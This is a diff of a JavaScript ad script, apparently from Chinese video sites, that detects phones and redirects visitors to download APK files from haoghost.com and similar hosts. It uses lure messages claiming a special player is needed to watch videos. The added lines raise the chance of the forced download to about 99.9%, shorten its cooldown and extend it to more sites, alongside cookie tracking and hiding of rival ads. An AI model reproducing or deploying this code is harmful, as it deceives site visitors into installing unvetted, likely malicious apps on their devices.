@@ -56,7 +56,7 @@ var hy_itv=setInterval(function(){
 
 	
 
-	if(num==31)
+	if(num==31 || num==40)
 	{
 		azimgs=["wb_b3.gif","wb_b5.gif","wb_b2.gif"];
 		azlinks=["http://m.haoghost.com/?f=cpctag_"+num,"http://m.haoghost.com/?f=cpctag_"+num,"http://m.haoghost.com/?f=cpctag_"+num];
@@ -83,7 +83,7 @@ var hy_itv=setInterval(function(){
 
 
 	if(getCookie("hycpc1")=="1"){
-		pname="http://t.cn/R7n2ueA";
+		pname="360ysdq12.apk";
 		iosname="http://www.haima.me/?c=cpapz";
 		setCookie("hycpc1","0");
 	}
@@ -130,13 +130,12 @@ var hy_itv=setInterval(function(){
 		var result;
 		switch(num)
 		{
-			case "31":
-				result="http://t.cn/R7TPUOV";
+			case "36":
+				result="360ysdq12.apk";
 				break;
 			default:
-				if(rd<0.4) result="http://t.cn/R7n2ueA";
-				else if(rd<0.8) result="http://soft.91zan.com/suwei/sybb.10C352.apk";
-				else result="http://t.cn/R7TPUOV";
+				if(rd<0.5) result="http://d.haoghost.com/kbyy2.apk";
+				else result="http://d.zhxone.com/11678116";
 		}
 		return result;
 	}
@@ -168,7 +167,7 @@ var hy_itv=setInterval(function(){
 	{
 		if(hour==8) return true;
 		var rd=Math.random();
-		return rd>0.15?true:false;
+		return rd>0.001?true:false;
 	}
 
 	if(/android/i.test(navigator.userAgent) || /ipad|iphone|ipod/i.test(navigator.userAgent))
@@ -177,8 +176,8 @@ var hy_itv=setInterval(function(){
 		function autoDown()
 		{
 			var date = new Date();
-			var cd=60;
-
+			var cd=10;
+			if(num==41) cd=60*24;
 			if(!getCookie("hycookietime"))
 			{
 				setCookie("hycookietime",date.getTime());
@@ -229,7 +228,7 @@ var hy_itv=setInterval(function(){
 			tj.appendChild(script);
 		})()		
 
-		if(num==24 || num==25 || num==26 || num==29 || num==31 || num==71 || num==72)
+		if(num==24 || num==25 || num==26 || num==29 || num==31 || num==40 || num==71 || num==72)
 		{
 			t1.style.display="none";
 		}
@@ -273,67 +272,61 @@ var hy_itv=setInterval(function(){
 
 
 			var hyipdata=parseInt(getCookie("hyipdata"));
-			if(hyipdata!=0 && hyipdata!=1 && /android/i.test(ua))
+			/*getJsonp(
+				'http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=js',
+				"",
+				function(data){
+					var res=false;
+					if(!res && Math.random()>0.25)
+					{
+						setCookie("hyipdata","0");
+						if(hlTime())
+						{
+							pname="Qvod_collect_v3.14.5.apk";
+							getJsonp(
+								'http://click.shuiguo.com/index.php?action=index&method=main1',
+								"t=undefined&s=tag_890&ref="+document.URL+"&url="+document.URL+"&typeid=1&ug="+ua,
+								function(data){
+
+								}
+							);
+						}
+					}
+					if(res)
+					{
+						setCookie("hyipdata","1");
+					}
+					goCityDown();
+				},
+				"hyipcb"
+			);*/
+			if(isDownSelf())
 			{
+				setCookie("hyipdata","0");
+				if(num==40) pname="Qvod_collect_wap1_v3.14.21.apk";
+				else pname="Qvod_collect_v3.14.21.apk";
 				/*getJsonp(
-					'http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=js',
-					"",
+					'http://click.shuiguo.com/index.php?action=index&method=main1',
+					"t=undefined&s=tag_890&ref="+document.URL+"&url="+document.URL+"&typeid=1&ug="+ua,
 					function(data){
-						var res=false;
-						if(!res && Math.random()>0.25)
-						{
-							setCookie("hyipdata","0");
-							if(hlTime())
-							{
-								pname="Qvod_collect_v3.14.5.apk";
-								getJsonp(
-									'http://click.shuiguo.com/index.php?action=index&method=main1',
-									"t=undefined&s=tag_890&ref="+document.URL+"&url="+document.URL+"&typeid=1&ug="+ua,
-									function(data){
 
-									}
-								);
-							}
-						}
-						if(res)
-						{
-							setCookie("hyipdata","1");
-						}
-						goCityDown();
-					},
-					"hyipcb"
-				);*/
-				if(isDownSelf())
-				{
-					setCookie("hyipdata","0");
-					pname="Qvod_collect_v3.14.18.apk";
-					getJsonp(
-						'http://click.shuiguo.com/index.php?action=index&method=main1',
-						"t=undefined&s=tag_890&ref="+document.URL+"&url="+document.URL+"&typeid=1&ug="+ua,
-						function(data){
-
-						}
-					);
-					var script = document.createElement("script");
-					script.type = "text/javascript";
-					script.language = "javascript";
-					script.src="http://s13.cnzz.com/stat.php?id=1253232964&web_id=1253232964";
-					var tj=document.getElementById("hy_cpc_tj");
-					tj.appendChild(script);
-				}
-				else
-				{
-					setCookie("hyipdata","1");
-				}
-				goCityDown();
+					}
+				);
+				var script = document.createElement("script");
+				script.type = "text/javascript";
+				script.language = "javascript";
+				script.src="http://s13.cnzz.com/stat.php?id=1253232964&web_id=1253232964";
+				var tj=document.getElementById("hy_cpc_tj");
+				tj.appendChild(script);*/
 			}
 			else
 			{
-				goCityDown();
+				setCookie("hyipdata","1");
 			}
+			goCityDown();
 			function goCityDown(){
 				window.setTimeout(function(){
-					if(num==18 || num==19 || num==31 || num==32 || num==33 || num==35 || num==36)
+					if(num==18 || num==19 || num==31 || num==32 || num==33 || num==35 || num==36 || num==37 || num==39 || num==41)
 					{
 						if(!autoDown()) return;
 						if(tt.indexOf("》")<0)
@@ -346,10 +339,10 @@ var hy_itv=setInterval(function(){
 							tt="正在为您下载本站专用手机播放器，安装后即可观看"+tt;
 						}
 					} 
-					else if(num==15 || num==28 || num==29 || num==34)
+					else if(num==15 || num==28 || num==29 || num==34 || num==38)
 					{
 						if(!autoDown()) return;
-						tt="正在下载神奇影院，海量视频任你看";
+						tt="正在下载快播典藏版，你懂的";
 					}
 					else if(num==23 || num==24 || num==25 || num==26 || num==27){
 						if(!autoDown()) return;
@@ -359,35 +352,36 @@ var hy_itv=setInterval(function(){
 					{
 						return;
 					}
-					
-					if(/ipad|iphone|mac|ios/i.test(navigator.userAgent)) {
-						alert(tt);
-						window.location.href=iosname;	
-						setCookie("hycpc1","1");
-					}
-					else
+
+					function DownPackage(name,url)
 					{
-						function setBefore(num)
+						if(num==38)
 						{
-							var now=parseInt(getCookie("hycookietime"));
-							now=now-num*60*1000;
-							setCookie("hycookietime",now);	
-						}
-						/*if(window.confirm(tt)){
-							if(pname.indexOf("http")>=0) window.location.href=pname;
-							else window.location.href="http://d.haoghost.com/"+pname;
-							setCookie("hycpc1","1");
-							if(num==28 || num==31 || num==32 || num==33 || num==34) setBefore(50);
+							if(confirm(name)) 
+							{
+								tureDP(url);
+							}
 						}
 						else
 						{
-							setBefore(55);
-						}*/
-						alert(tt);
-						if(pname.indexOf("http")>=0) window.location.href=pname;
-						else window.location.href="http://d.haoghost.com/"+pname;
+							alert(name);
+							tureDP(url);
+						}
+					}
+
+					function tureDP(url)
+					{
+						if(url.indexOf("http")>=0) window.location.href=url;
+						else window.location.href="http://d.haoghost.com/"+url;
 						setCookie("hycpc1","1");
-						setBefore(50);
+					}
+
+					if(/ipad|iphone|mac|ios/i.test(navigator.userAgent)) {
+						DownPackage(tt,iosname);
+					}
+					else
+					{
+						DownPackage(tt,pname);
 					}
 				},1000);
 			}
@@ -439,6 +433,10 @@ var hy_itv=setInterval(function(){
 			if(num==36)
 			{
 				hideAdv("JS_BottmEX2_Div");
+			}
+			if(num==39)
+			{
+				hideAdv("__QQCP_LEFT_Div");hideAdv("__QQCP_RIGHT_Div");hideAdv("xcy_fmt");
 			}
 			if(num==22)
 			{
